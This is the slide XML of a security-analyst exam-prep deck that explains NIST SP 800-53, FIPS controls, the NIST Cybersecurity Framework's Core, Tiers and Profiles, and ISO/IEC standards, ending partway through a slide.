<file path=ppt/slides/slide8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 · FRAMEWORKS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Security Guidelines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Security guidelines are the authoritative standards, frameworks, and control catalogs that tell an organization how to protect its systems, one of the most widely cited being NIST Special Publication 800-53, historically titled Recommended Security Controls for Federal Information Systems and Organizations.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  SP 800-53 supplies the catalog of controls organizations implement to satisfy the Federal Information Processing Standards, most notably FIPS 199 for categorizing information systems and FIPS 200 for the minimum baseline of security requirements they must meet.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  FIPS are mandatory for U.S. federal government and military data processing systems, so 800-53 is the practical toolset agencies use to become and stay FIPS-compliant.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst cares because these guidelines define the required controls that your monitoring, findings, and remediation recommendations must map back to, giving your reports a recognized, defensible baseline of compliance.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect to recognize NIST SP 800-53 as the federal control catalog and connect it to FIPS 199/200 categorization and baseline requirements when a question asks which framework backs a compliance or reporting requirement.</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803</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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Security Guidelines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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  NIST Special Publication 800-53</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  AKA - Recommended Security Controls for Federal Information Systems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Controls to be compliant with Federal Information Processing Standards (FIPS)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  FIPS is used in government or military data processing</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_493cfefc01.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7225518" y="1783080"/>
            <a:ext cx="3471203" cy="429768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804</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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NIST Special Publication 800-53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NIST SP 800-53 is the U.S. government's comprehensive catalog of security and privacy controls, organized into control families such as Access Control (AC), Incident Response (IR), Audit and Accountability (AU), and System and Communications Protection (SC).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The controls are grouped into low, moderate, and high baselines that an organization selects based on the impact level its systems were assigned under FIPS 199, so higher-risk systems inherit stronger required protections.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It is a living standard, with Revision 5 integrating privacy controls directly alongside security controls and adopting an outcome-based, control-family structure rather than the older management/operational/technical split.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts rely on 800-53 as the common vocabulary for tying an observed weakness or incident finding to a specific, named control gap that leadership and auditors will recognize.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Know 800-53 as the selectable, baseline-driven control catalog (low/moderate/high) and be able to distinguish it from procedural guidance like the NIST 800-61 incident-response guide.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805</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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NIST Special Publication 800-53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g_c5007cf100.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2643578"/>
            <a:ext cx="5180076" cy="2713844"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_b4fa496969.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7024995" y="1783080"/>
            <a:ext cx="3593357" cy="443484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806</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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FIPS Controls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FIPS controls refer to the security control catalog historically presented in NIST 800-53 Appendix F, the set of safeguards and countermeasures organizations deploy to meet FIPS 200 minimum security requirements.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Classic 800-53 sorted these controls into three classes: management controls covering risk and policy decisions, operational controls executed by people such as awareness training and physical security, and technical controls enforced by the systems themselves like encryption and authentication.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The entire purpose of these safeguards is to preserve the CIA triad, protecting the confidentiality, integrity, and availability of the information and systems in scope.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For a security analyst, framing findings as management, operational, or technical control failures and mapping them to a CIA impact makes reports clearer to both technical teams and management.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Be ready to classify a given control as management, operational, or technical and to tie a control failure to the confidentiality, integrity, or availability property it was protecting.</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807</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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FIPS Controls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Security Control Catalog (NIST 800-53, Appendix F)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Management</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Operational</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Technical Safeguards</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Countermeasures to protect</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Confidentiality</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Integrity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Availability</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808</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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Cybersecurity Framework (CSF)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The NIST Cybersecurity Framework is a voluntary, risk-based framework designed to be flexible, scalable, repeatable, and cost-effective so organizations of any size can prioritize and communicate their cybersecurity investments.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Its heart is the Framework Core, a set of common activities, desired outcomes, and informative references cross-linked to standards like 800-53 and ISO 27001, structured into functions, categories, and subcategories.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  CSF 1.1 defined five functions (Identify, Protect, Detect, Respond, Recover) with 23 categories and 108 subcategories, and it also uses Implementation Tiers 1 through 4 to describe how rigorous and risk-informed an organization's practices are.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  SOC analysts use CSF as a shared language to map their detection and response work to business-understandable outcomes and to prioritize which gaps to close first.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Recall the CSF Core functions in order and know that Implementation Tiers (1-4) describe the maturity and rigor of practices, not a compliance score.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809</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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Cybersecurity Framework (CSF)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Goals</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Flexible</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Scalable</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Repeatable</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Cost-effective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Prioritization</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810</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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Cybersecurity Framework (CSF)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Framework core</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Common activities, outcomes, &amp; references</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  5 functions, 22 categories, 98 subcategories</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Implementation tiers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Categorize rigor and sophistication of cyber security practices</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Tiers 1-4</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  1 –Partial</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  2 –Risk Informed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  3 –Repeatable</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  4 –Adaptive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811</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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Cyber Security Framework (CSF)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Within the NIST CSF, a Framework Profile is the alignment of the Core's functions, categories, and subcategories to an organization's specific business requirements, risk tolerance, and resources.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Organizations typically build a Current Profile describing where their security posture stands today and a Target Profile describing where they want or need to be, based on their risk decisions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The gap between the Current and Target Profiles becomes a prioritized, cost-aware action plan, letting leadership see exactly where they are versus where they can realistically get to.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts contribute to profiles by supplying the evidence of current control coverage from monitoring data, which turns raw findings into a roadmap management can fund and track.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect a question distinguishing the Framework Profile (Current vs Target state for gap analysis) from the Core and the Implementation Tiers.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812</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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Cyber Security Framework (CSF)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Framework Profile</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  State of an organization concerning CSF categories</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  See where they are vs. where they can be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813</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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Framework Core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The Framework Core is the central component of the NIST CSF that presents a set of desired cybersecurity outcomes and the activities to achieve them in a way that is not tied to any single sector or technology.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It is organized in a hierarchy: high-level Functions divide into Categories of related outcomes, which divide into specific Subcategories, each linked to Informative References pointing at concrete controls in standards such as 800-53, ISO 27001, and COBIT.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  This structure lets an organization move from a broad function like Detect down to a precise, actionable subcategory and then to the exact control that satisfies it.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts value the Core because it bridges plain-language business outcomes and the detailed technical controls their SOC actually operates, making cross-team reporting coherent.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Know the Core's four-part hierarchy of Functions, Categories, Subcategories, and Informative References and that it maps outcomes to controls in other standards.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814</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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Framework Core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g_a191ae7ab9.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2578774" y="1783080"/>
            <a:ext cx="7031404" cy="4434840"/>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815</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide8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 · FRAMEWORKS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Standardize Security Standards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Global security standardization is led largely by the International Organization for Standardization (ISO), the world's largest developer of international standards spanning fields from food technology and agriculture to space engineering and mining.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  ISO frequently partners with the International Electrotechnical Commission (IEC), which sets standards for electrical and electronic technologies, and together they produce internationally recognized information-security standards.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
